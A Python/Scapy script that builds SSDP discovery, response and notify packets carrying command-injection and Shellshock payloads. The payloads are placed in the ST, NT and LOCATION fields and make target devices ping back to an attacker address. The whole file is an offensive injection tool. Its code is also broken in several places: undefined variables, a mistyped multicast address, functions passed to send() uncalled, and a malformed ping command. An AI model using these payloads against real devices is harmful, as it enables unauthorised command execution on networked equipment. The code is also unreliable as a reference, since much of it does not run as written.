#!/bin/python3
from scapy.all import *
import os,sys
import time
import ipaddress

############################
# Name: ssdp-injector.py
# Author: Don C. Weber (cutaway)
# Start Data: 20201209
# Last Update: 20201215
#
# License: See License file: 
#
# TODO:
#   - Add command injection attacks
#   - Add additional Shellshock attacks
#   - Add debugging output
############################

# Local Variables
DEBUG           = 0
TARGET_IP       = '' 
ATTACKER_IP     = '' # FIXME: have user select interface and get IP and MAC from system
BROADCAST_IP    = '239.25.255.250'
TARGET_PORT     = 1900 # Default SSDP port is 1900. Used for both source and destination ports.
TARGET_PORT_MAX = 65535
MODE            = 0 # NOTE: 0 is MSEARCH, 1 is RESPONSE, 2 is NOTIFY
MODE_MAX        = 2
ATTACK_TYPE_MAX = 2


# Attacks 
## Shell Commands
PING_CMD = 'ping -c -p ssdp_attack ' + ATTACKER_IP
## Shellshock
SHELLSHOCK_PING_CMD = '(){:;}; ' + PING_CMD

# Functions
def usage():
    print("ssdp-injector.py:  This script will inject Simple Service Discovery Protocol (SSDP) packets onto the network.")
    print("")
    print("-h:                  print usage information")
    print("-m <number>:         interaction mode - 0 for M-SEARCH, 1 for RESPONSE, 2 for NOTIFY. Default: 0")
    print("-t <target IP>:      IP address for target system - required")
    print("-l <local IP>:       IP address for local system - required")
    print("-i <interface>:      Interface to send traffic - required")
    print("-a <number>:  Attack method by number. Default: 0")
    print("     0: Normal SSDP traffic.")
    print("     1: Ping command attached to ST / NT fields.")
    print("     2: Shellshock ping command attacked to ST / NT fields.")
    sys.exit()

def ssdp_Search_Mode():
    # SSDP Search Settings
    ## Fields
    ssdp_SEARCH             = 'M-SEARCH * HTTP/1.1' 
    ssdp_SEARCH_HOST        = TARGET_IP + ':1900'
    ssdp_SEARCH_MAN         = 'ssdp:discover'
    ssdp_SEARCH_MX          = '1'
    ssdp_SEARCH_ST          = 'urn:schemas-upnp-org:device:ATTACKER:1'
    ssdp_SEARCH_ST_UUID_CMD = 'uuid:' + CMD
    ssdp_SEARCH_USER_AGENT  = 'Attacker Host'
    ## Payloads

    if PAYLOAD == 0:
        # payload_SEARCH_NORMAL
        ATTACK_PAYLOAD     = ("%s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_SEARCH_HOST,ssdp_SEARCH_MAN,ssdp_SEARCH_MX,ssdp_SEARCH_ST,ssdp_SEARCH_USER_AGENT))
    if PAYLOAD == 1:
        # payload_SEARCH_PING
        ATTACK_PAYLOAD = ("%s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_SEARCH_HOST,ssdp_SEARCH_MAN,ssdp_SEARCH_MX,ssdp_SEARCH_ST + '; ' + PING_CMD,ssdp_SEARCH_USER_AGENT))
    if PAYLOAD == 2:
        # payload_SEARCH_SHELLSHOCK
        ATTACK_PAYLOAD = ("%s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_SEARCH_HOST,shellShock,shellShock,shellShock,shellShock))


    #ssdpPacket = IP(dst=ssdp_DST)/UDP(sport=ssdp_PORT,dport=ssdp_PORT)/payload
    OUT_PACKET = IP(dst=BROADCAST_IP)/UDP(sport=TARGET_PORT,dport=TARGET_PORT)/ATTACK_PAYLOAD
    return OUT_PACKET

def ssdp_Response_Mode():
    # SSDP Response Settings
    ## Fields
    ssdp_RESP          = 'HTTP/1.1 200 OK'
    ssdp_RESP_CACHE    = 'max-age=120'
    ssdp_RESP_DATE     = ''
    ssdp_RESP_EXT      = ''
    ssdp_RESP_LOC      = ATTACKER_IP + ':1337'
    ssdp_RESP_SERVER   = 'Attacker Host'
    ssdp_RESP_ST       = 'urn:schemas-upnp-org:device:ATTACKER:1'
    ssdp_RESP_USN      = '99999'
    ssdp_RESP_SM_ID    = 'c8:0a:a9:16:35:e9' # FIXME: have user select interface and get IP and MAC from system
    ssdp_RESP_DEV_TYPE = 'Attacker'
    ## Payloads
    if PAYLOAD == 0:
        # payload_RESP_NORMAL
        ATTACK_PAYLOAD     = ("%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_RESP,ssdp_RESP_CACHE,ssdp_RESP_DATE,ssdp_RESP_EXT,ssdp_RESP_LOC,ssdp_RESP_SERVER,ssdp_RESP_ST,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
    if PAYLOAD == 1:
        # payload_RESP_PING
        ATTACK_PAYLOAD = ("%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_RESP,ssdp_RESP_CACHE,ssdp_RESP_DATE,ssdp_RESP_EXT,ssdp_RESP_LOC,ssdp_RESP_SERVER,ssdp_RESP_ST + '; ' + PING_CMD,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
    if PAYLOAD == 2:
        # payload_RESP_SHELLSHOCK
        ATTACK_PAYLOAD = ("%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_RESP,ssdp_RESP_CACHE,ssdp_RESP_DATE,ssdp_RESP_EXT,shellShock,ssdp_RESP_SERVER,shellShock,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))

    #ssdpPacket = IP(dst=TARGET_IP)/UDP(sport=ssdp_PORT,dport=ssdp_PORT)/payload
    OUT_PACKET = IP(dst=TARGET_IP)/UDP(sport=TARGET_PORT,dport=TARGET_PORT)/ATTACK_PAYLOAD
    return OUT_PACKET

def ssdp_Notify_Mode():
    # SSDP Notify Settings
    ## Fields
    ssdp_NOTIFY          = 'NOTIFY * HTTP/1.1'
    ssdp_NOTIFY_HOST     = BROADCAST_IP + ':1900'
    ssdp_NOTIFY_CACHE    = 'max-age=120'
    ssdp_NOTIFY_LOC      = ATTACKER_IP + ':1337'
    ssdp_NOTIFY_SERVER   = 'Attacker Host'
    ssdp_NOTIFY_NT       = 'urn:schemas-upnp-org:device:ATTACKER:1'
    ssdp_NOTIFY_NTS      = 'ssdp:alive'
    ssdp_NOTIFY_USN      = '99999'
    ssdp_NOTIFY_SM_ID    = 'c8:0a:a9:16:35:e9' # FIXME: have user select interface and get IP and MAC from system
    ssdp_NOTIFY_DEV_TYPE = 'Attacker'
    ## Payloads
    if PAYLOAD == 0:
        # payload_NOTIFY_NORMAL
        ATTACK_PAYLOAD     = ("%s\r\nHOST:%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_NOTIFY,ssdp_NOTIFY_HOST,ssdp_NOTIFY_CACHE,ssdp_RESP_LOC,ssdp_RESP_SERVER,ssdp_RESP_NT,ssdp_RESP_NTS,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
    if PAYLOAD == 1:
        # payload_NOTIFY_SHELLSHOCK
        ATTACK_PAYLOAD = ("%s\r\nHOST:%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_NOTIFY,ssdp_NOTIFY_HOST,ssdp_NOTIFY_CACHE,shellShock,ssdp_RESP_SERVER,shellShock,ssdp_RESP_NTS,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))
    if PAYLOAD == 2:
        # payload_NOTIFY_SHELLSHOCK
        ATTACK_PAYLOAD = ("%s\r\nHOST:%s\r\nCACHE-CONTROL:%s\r\nDATE:%s\r\nEXT:%s\r\nLOCATION:%s\r\nSERVER:%s\r\nST:%s\r\nUSN:%s\r\nSM_ID:%s\r\nDEV_TYPE:%s\r\n\r\n"%(ssdp_NOTIFY,ssdp_NOTIFY_HOST,ssdp_NOTIFY_CACHE,shellShock,ssdp_RESP_SERVER,shellShock,ssdp_RESP_NTS,ssdp_RESP_USN,ssdp_RESP_SM_ID,ssdp_RESP_DEV_TYPE))

    #ssdpPacket = IP(dst=BROADCAST_IP)/UDP(sport=ssdp_PORT,dport=ssdp_PORT)/payload
    OUT_PACKET = IP(dst=BROADCAST_IP)/UDP(sport=TARGET_PORT,dport=TARGET_PORT)/ATTACK_PAYLOAD
    return OUT_PACKET

##############################
# Main Function
##############################
if __name__ == "__main__":

    ###############################
    # Process Command Line Options
    # This is a popular switch method that can be used instead of argparser.
    ###############################
    ops = ['-h','-d','-m','-t','-l','-b','-a']

    cnt = 0
    while len(sys.argv) > 1:
        op = sys.argv.pop(1)
        if op == '-h':
            usage()
        if op == '-d':
            # Not required. Default is 0
            try:
                DEBUG = int(sys.argv.pop(1))
            except:
                usage()
        if op == '-m':
            # Not required. Default is 0
            # MODE: 0 = M-SEARCH, 1 = Response, 2 = Notify
            try:
                MODE = sys.argv.pop(1)
            except:
                usage()
            if MODE > MODE_MAX:
                print("ERROR: %s is not a valid MODE"%(MODE))
                usage()
        if op == '-t':
            # Required
            try:
                TARGET_IP = ipaddress.ip_address(sys.argv.pop(1))
            except:
                print("ERROR: %s is not valid TARGET IP address"%(TARGET_IP))
                usage()
        if op == '-l':
            # Required
            try:
                ATTACKER_IP = ipaddress.ip_address(sys.argv.pop(1))
            except:
                print("ERROR: %s is not valid ATTACKER IP address"%(ATTACKER_IP))
                usage()
        if op == '-b':
            # Not required
            try:
                BROADCAST_IP = ipaddress.ip_address(sys.argv.pop(1))
            except:
                print("ERROR: %s is not valid Broadcast IP address"%(BROADCAST_IP))
                usage()
        if op == '-i':
            # Not required
            IFACE = sys.argv.pop(1)
            if IFACE not in get_if_list():
                print("ERROR: %s is not in list of interfaces"%(IFACE))
                usage()
        if op == '-a':
            # Not required. Default is 0
            try:
                ATTACK_TYPE = int(sys.argv.pop(1))
            except:
                usage()
            if ATTACK_TYPE > ATTACK_TYPE_MAX:
                print("ERROR: %s is not a valid ATTACK type"%(ATTACK_TYPE))
                usage()
        if op not in ops:
            print("Unknown option: %s"%(op))
            usage()

    # Test for user input
    if not TARGET_IP or not LOCAL_IP or not IFACE:
        usage()
    ###############################

    # Send Packets
    ## M-SEARCH
    if MODE == 0:
        ssdpPacket = ssdp_Search_Mode
    ## RESPONSE
    if MODE == 1:
        ssdpPacket = ssdp_Response_Mode
    ## NOTIFY
    if MODE == 2:
        ssdpPacket = ssdp_Notify_Mode

    # Send multiple times with delay to ensure delivery
    send(ssdpPacket)
    time.sleep(2) # Send and give time to see response
    send(ssdpPacket)
    time.sleep(2) # Send and give time to see response
    send(ssdpPacket)

